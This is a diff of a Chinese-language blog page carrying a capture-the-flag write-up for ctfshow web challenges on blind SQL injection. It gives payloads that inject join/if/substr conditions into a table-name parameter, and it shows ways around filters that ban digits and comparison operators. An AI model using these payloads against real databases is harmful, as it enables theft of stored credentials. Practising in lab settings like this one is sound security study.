@@ -160,6 +160,12 @@
 <p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117160637.png" alt="image-20201117160630571"></p>
 <p>构造playload：tableName=ctfshow_user a join ctfshow_user b on if(b.id&gt;23,if(a.id&gt;23,if(ascii(substr(b.pass,1,1))&gt;102,1,0),0),0)</p>
 <p>取别名a,b然后发现and or被禁用了，但是我们可以用if语句达到相同的效果。</p>
+<h2 id="web入门185"><a href="#web入门185" class="headerlink" title="web入门185:"></a>web入门185:</h2><p>他把数字禁掉了，就很过分。但是我们也有办法，就是用true和false代替，我不知道其他大佬是怎么写的，我感觉我的方法有一点low。把payload对应的数换成对应的true相加。</p>
+<h2 id="web入门186"><a href="#web入门186" class="headerlink" title="web入门186:"></a>web入门186:</h2><p>他把大于号，小于号禁用了，但是我们可以用round(x/2y)来判断x和y 是否相等，其实不用round也行，这个是四舍五入，于是人为的比较了大小。一下是payload</p>
+<p>payload = {‘tableName’: ‘’’ctfshow_user a join ctfshow_user b on if(round(b.id/%s),if(round(a.id/%s),if(round(ascii(substr(b.pass,%s,true))/%s),true,false),false),false)’’’ % (‘(‘+’true+’*44+’true)’,’(‘+’true+’*44+’true)’, ‘(‘+’true+’*(j-1)+’true)’, ‘(‘+’true+’*(2*i-1)+’true)’)}</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201118201857.png" alt="image-20201118201850010"></p>
+<p>得到flag<img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201118202058.png" alt="image-20201118202058924"></p>
+<p>记得结果要i-1.</p>
  
       <!-- reward -->
       
